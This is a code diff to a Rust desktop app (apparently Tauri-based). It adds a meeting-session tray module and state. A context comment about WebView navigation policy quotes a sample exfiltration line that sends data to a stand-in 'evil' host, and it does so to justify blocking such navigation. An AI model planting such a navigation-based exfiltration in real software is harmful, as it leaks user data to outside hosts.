@@ -26,6 +26,8 @@ pub use myne_core::export_naming;
 // side-effects the shared command cores trigger (search/spell/attachments/
 // pdf/workspace/screen-capture/sync) that do not live in `myne-core`.
 mod hooks;
+/// The meeting-session menubar indicator (myne-md/myne#789).
+mod tray;
 pub use myne_core::io_failure_kind;
 // App-global WebView navigation policy (myne#383). The CSP has no directive
 // that governs a top-level navigation, so `location = "https://evil/?d=" +
@@ -538,6 +540,10 @@ pub fn run() {
             // at most one in-progress mic capture; only Send control handles —
             // the cpal stream lives inside the capture thread).
             app.manage(plugins::attachments::VoiceRecordState::default());
+            // The meeting-session singleton (myne-md/myne#789), managed beside
+            // the voice one because the two share a capture path and must
+            // exclude each other.
+            app.manage(plugins::attachments::MeetingSessionState::default());
             // MYND-29 Task 7: periodic best-effort flush of the search index
             // to its encrypted `vault.search` blob while a vault is Unlocked
             // (no-op while locked). Bounds how much a hard quit / crash loses
